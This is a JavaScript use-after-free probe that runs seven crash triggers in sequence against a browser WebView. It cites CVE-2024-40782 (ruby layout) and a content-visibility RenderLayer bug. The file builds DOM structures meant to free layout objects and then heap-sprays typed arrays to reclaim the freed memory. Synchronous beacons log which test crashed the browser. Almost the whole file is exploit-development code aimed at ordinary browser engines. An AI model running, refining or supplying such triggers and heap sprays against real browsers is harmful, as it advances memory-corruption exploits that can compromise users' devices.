// p209 — Combined UAF probe: best candidates
//
// Runs the most promising crash triggers back to back:
// 1. CVE-2024-40782 Ruby continuation UAF (exact regression test)
// 2. Bug #287908 content-visibility RenderLayer UAF
// 3. Ruby amplified variations
// 4. content-visibility + z-order stale list
//
// If ANY test crashes the WebView, the last beacon tells us which one hit.
//
// Beacon prefix: V209-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V209-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  B('BOOT');

  var testNum = 0;

  function nextTest(name, fn) {
    testNum++;
    B(name + '-START');
    try {
      fn(function() {
        B(name + '-END');
      });
    } catch (e) {
      B(name + '-ERR-' + e.name);
    }
  }

  function runSequence(seq, idx) {
    if (idx >= seq.length) { B('ALL-DONE'); return; }
    var t = seq[idx];
    B(t[0] + '-START');
    var done = false;
    var timer = setTimeout(function() {
      if (!done) { done = true; B(t[0] + '-TIMEOUT'); runSequence(seq, idx+1); }
    }, 10000);
    try {
      t[1](function() {
        if (!done) { done = true; clearTimeout(timer); B(t[0] + '-END'); setTimeout(function() { runSequence(seq, idx+1); }, 200); }
      });
    } catch (e) {
      if (!done) { done = true; clearTimeout(timer); B(t[0] + '-ERR-' + e.name); setTimeout(function() { runSequence(seq, idx+1); }, 200); }
    }
  }

  var sequence = [];

  // ── 1. CVE-2024-40782: Exact regression test ──
  sequence.push(['RUBY-EXACT', function(done) {
    var c = document.createElement('div');
    c.innerHTML = '<ruby style="position:absolute"><rb><span>base with <div>forced</div> line break</span></rb></ruby>';
    document.body.appendChild(c);
    var _ = document.body.offsetHeight;
    B('RUBY-EXACT-LAYOUT');
    _ = c.getBoundingClientRect();
    setTimeout(function() { c.remove(); done(); }, 300);
  }]);

  // ── 2. Ruby amplified (100 instances) ──
  sequence.push(['RUBY-100', function(done) {
    var c = document.createElement('div');
    c.style.cssText = 'position:relative;';
    document.body.appendChild(c);
    var html = '';
    for (var i = 0; i < 100; i++) {
      html += '<ruby style="position:absolute;top:' + i + 'px"><rb><span>b<div>f</div>c</span></rb></ruby>';
    }
    c.innerHTML = html;
    var _ = document.body.offsetHeight;
    B('RUBY-100-LAYOUT');
    // Remove all and re-add with spray
    c.innerHTML = '';
    var spray = [];
    for (var k = 0; k < 5000; k++) spray.push(new Uint32Array(16));
    c.innerHTML = html;
    _ = document.body.offsetHeight;
    B('RUBY-100-REBUILD');
    spray = null;
    setTimeout(function() { c.remove(); done(); }, 300);
  }]);

  // ── 3. Ruby variations (float, fixed, display:block, nested) ──
  sequence.push(['RUBY-VARS', function(done) {
    var c = document.createElement('div');
    document.body.appendChild(c);
    c.innerHTML = [
      '<ruby style="position:absolute"><rb><span>a<div style="float:left">f</div>b</span></rb></ruby>',
      '<ruby style="display:block"><rb><span>x<div>b</div>y</span></rb><rt>t</rt></ruby>',
      '<ruby style="position:absolute"><rb><div>direct block</div></rb></ruby>',
      '<ruby style="position:fixed"><rb><span>fx<div>b</div>p</span></rb></ruby>',
      '<ruby style="position:absolute"><rb><span style="display:contents">c<div>b</div></span></rb></ruby>',
      '<ruby style="position:absolute"><rb><span>n<ruby><rb><div>deep</div></rb></ruby></span></rb></ruby>',
    ].join('');
    var _ = document.body.offsetHeight;
    B('RUBY-VARS-LAYOUT');
    setTimeout(function() { c.remove(); done(); }, 300);
  }]);

  // ── 4. content-visibility: basic toggle + child removal ──
  sequence.push(['CV-BASIC', function(done) {
    var c = document.createElement('div');
    c.style.cssText = 'position:relative;width:400px;height:400px;overflow:hidden;content-visibility:auto;contain-intrinsic-size:400px 400px;';
    document.body.appendChild(c);
    var layers = [];
    var p = c;
    for (var i = 0; i < 20; i++) {
      var l = document.createElement('div');
      l.style.cssText = 'position:absolute;z-index:' + (20-i) + ';width:' + (300-i*10) + 'px;height:' + (300-i*10) + 'px;will-change:transform;background:rgba(' + (i*12) + ',100,200,0.5);';
      p.appendChild(l);
      layers.push(l);
      p = l;
    }
    var _ = c.offsetHeight;
    c.style.contentVisibility = 'hidden';
    _ = c.offsetHeight;
    layers[10].remove();
    B('CV-BASIC-REMOVED');
    var spray = [];
    for (var k = 0; k < 5000; k++) spray.push(new Uint8Array(128));
    setTimeout(function() {
      c.style.contentVisibility = 'auto';
      B('CV-BASIC-RESTORED');
      _ = c.offsetHeight;
      _ = document.body.offsetHeight;
      B('CV-BASIC-LAYOUT');
      spray = null;
      setTimeout(function() { c.remove(); done(); }, 500);
    }, 50);
  }]);

  // ── 5. content-visibility: z-order stale list ──
  sequence.push(['CV-ZORDER', function(done) {
    var c = document.createElement('div');
    c.style.cssText = 'position:relative;width:400px;height:400px;overflow:auto;content-visibility:auto;';
    document.body.appendChild(c);
    var posL = [];
    for (var i = 0; i < 10; i++) {
      var pos = document.createElement('div');
      pos.style.cssText = 'position:absolute;z-index:' + (i+1) + ';width:50px;height:50px;left:' + (i*40) + 'px;will-change:transform;background:red;';
      c.appendChild(pos);
      posL.push(pos);
    }
    var _ = c.offsetHeight;
    c.style.contentVisibility = 'hidden';
    _ = c.offsetHeight;
    for (var j = 0; j < posL.length; j++) posL[j].remove();
    B('CV-ZORDER-REMOVED');
    var spray = [];
    for (var k = 0; k < 10000; k++) spray.push(new Uint8Array(64));
    setTimeout(function() {
      c.style.contentVisibility = 'auto';
      _ = c.offsetHeight;
      c.style.width = '401px';
      _ = c.offsetHeight;
      B('CV-ZORDER-LAYOUT');
      spray = null;
      setTimeout(function() { c.remove(); done(); }, 500);
    }, 100);
  }]);

  // ── 6. content-visibility: rapid toggle cycle ──
  sequence.push(['CV-RAPID', function(done) {
    var w = document.createElement('div');
    w.style.cssText = 'position:relative;width:500px;height:500px;';
    document.body.appendChild(w);
    var comp = document.createElement('div');
    comp.style.cssText = 'position:absolute;will-change:transform;width:400px;height:400px;overflow:hidden;';
    w.appendChild(comp);
    var cv = document.createElement('div');
    cv.style.cssText = 'content-visibility:auto;contain-intrinsic-size:400px 800px;position:relative;';
    comp.appendChild(cv);
    var children = [];
    for (var i = 0; i < 40; i++) {
      var ch = document.createElement('div');
      ch.style.cssText = 'position:relative;z-index:' + (i%5) + ';height:20px;will-change:' + (i%2?'opacity':'transform') + ';background:hsl(' + (i*9) + ',80%,60%);';
      cv.appendChild(ch);
      children.push(ch);
    }
    var _ = w.offsetHeight;
    var cycle = 0;
    function toggle() {
      if (cycle >= 10) { B('CV-RAPID-DONE'); w.remove(); done(); return; }
      cycle++;
      cv.style.contentVisibility = 'hidden';
      _ = w.offsetHeight;
      for (var j = children.length-1; j >= Math.max(0,children.length-5); j--) {
        if (children[j] && children[j].parentNode) children[j].parentNode.removeChild(children.splice(j,1)[0]);
      }
      var s = [];
      for (var k = 0; k < 2000; k++) s.push(new ArrayBuffer(96));
      cv.style.contentVisibility = 'auto';
      _ = w.offsetHeight;
      s = null;
      for (var m = 0; m < 3; m++) {
        var nc = document.createElement('div');
        nc.style.cssText = 'position:relative;z-index:' + ((cycle*3+m)%5) + ';height:20px;will-change:opacity;background:green;';
        cv.appendChild(nc);
        children.push(nc);
      }
      setTimeout(toggle, 30);
    }
    toggle();
  }]);

  // ── 7. Ruby + content-visibility combined ──
  sequence.push(['RUBY-CV', function(done) {
    var c = document.createElement('div');
    c.style.cssText = 'content-visibility:auto;contain-intrinsic-size:400px 400px;position:relative;overflow:hidden;width:400px;height:400px;';
    document.body.appendChild(c);
    var html = '';
    for (var i = 0; i < 50; i++) {
      html += '<ruby style="position:absolute;top:' + (i*8) + 'px;z-index:' + i + ';will-change:transform"><rb><span>b' + i + '<div>f</div>c</span></rb></ruby>';
    }
    c.innerHTML = html;
    var _ = c.offsetHeight;
    B('RUBY-CV-INITIAL');
    c.style.contentVisibility = 'hidden';
    _ = c.offsetHeight;
    c.innerHTML = '';
    B('RUBY-CV-CLEARED');
    var spray = [];
    for (var k = 0; k < 5000; k++) spray.push(new Uint32Array(16));
    setTimeout(function() {
      c.style.contentVisibility = 'auto';
      c.innerHTML = html;
      _ = c.offsetHeight;
      B('RUBY-CV-REBUILT');
      spray = null;
      setTimeout(function() { c.remove(); done(); }, 500);
    }, 100);
  }]);

  runSequence(sequence, 0);
})();
